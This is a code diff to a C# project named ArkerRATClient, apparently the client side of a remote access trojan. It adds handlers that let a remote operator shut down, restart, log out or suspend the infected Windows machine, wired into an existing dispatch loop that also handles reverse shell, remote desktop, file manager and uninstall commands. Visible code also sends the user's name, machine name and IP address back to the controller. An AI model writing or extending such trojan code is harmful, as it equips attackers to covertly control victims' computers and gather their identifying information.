@@ -105,13 +105,21 @@ namespace ArkerRATClient
                                 data += stringBuilder.ToString();
                             }
 
+                        await Task.Run(() => SortData("§PingStart§", "§PingEnd§"));
+
                         await Task.Run(() => SortData("§DisconnectStart§", "§DisconnectEnd§"));
                         await Task.Run(() => SortData("§UninstallStart§", "§UninstallEnd§"));
-                        await Task.Run(() => SortData("§ReverseShellStart§", "§ReverseShellEnd§"));
-                        await Task.Run(() => SortData("§PingStart§", "§PingEnd§"));
                         await Task.Run(() => SortData("§RemoteDesktopStart§", "§RemoteDesktopEnd§"));
+
+                        await Task.Run(() => SortData("§ReverseShellStart§", "§ReverseShellEnd§"));
                         await Task.Run(() => SortData("§ReconnectStart§", "§ReconnectEnd§"));
                         await Task.Run(() => SortData("§FileManagerStart§", "§FileManagerEnd§"));
+
+                        await Task.Run(() => SortData("§ShutDownStart§", "§ShutDownEnd§"));
+                        await Task.Run(() => SortData("§RestartStart§", "§RestartEnd§"));
+                        await Task.Run(() => SortData("§LogOutStart§", "§LogOutEnd§"));
+                        await Task.Run(() => SortData("§SleepStart§", "§SleepEnd§"));
+
 
 
 
@@ -254,6 +262,22 @@ namespace ArkerRATClient
                         {
                             CloseConnection();
                         }
+                        else if (startDelimiter=="§ShutDownStart§")
+                        {
+                            ShutDown();
+                        } 
+                        else if (startDelimiter=="§RestartStart§")
+                        {
+                            Restart();
+                        }
+                        else if (startDelimiter=="§LogOutStart§")
+                        {
+                            LogOut();
+                        } 
+                        else if (startDelimiter=="§SleepStart§")
+                        {
+                            Sleep();
+                        }
                     }
                     else
                     {
@@ -306,5 +330,31 @@ namespace ArkerRATClient
              }
             await SendData("§ClientInfoStart§"+"§ResulotionStart§" + Screen.PrimaryScreen.Bounds.Height + "," + Screen.PrimaryScreen.Bounds.Width + "§ResulotionEnd§" + Environment.UserName + "," + FriendlyName() + "," +SendIp()+"§ClientInfoEnd§");
         }
+
+        private static void ShutDown()
+        {
+            Process.Start("shutdown", "/s /t 0");
+        }
+
+        private static void Restart()
+        {
+            Process.Start("shutdown", "/r /t 0");
+        }
+
+        private static void LogOut()
+        {
+            Process.Start("shutdown", "/l");
+        }
+
+        private static void Sleep()
+        {
+            SetSuspendState(false, true, true);
+        }
+
+        // Import the necessary Windows API function for Sleep mode
+        [System.Runtime.InteropServices.DllImport("PowrProf.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto, ExactSpelling = true)]
+        public static extern bool SetSuspendState(bool hibernate, bool forceCritical, bool disableWakeEvent);
     }
+
 }
+
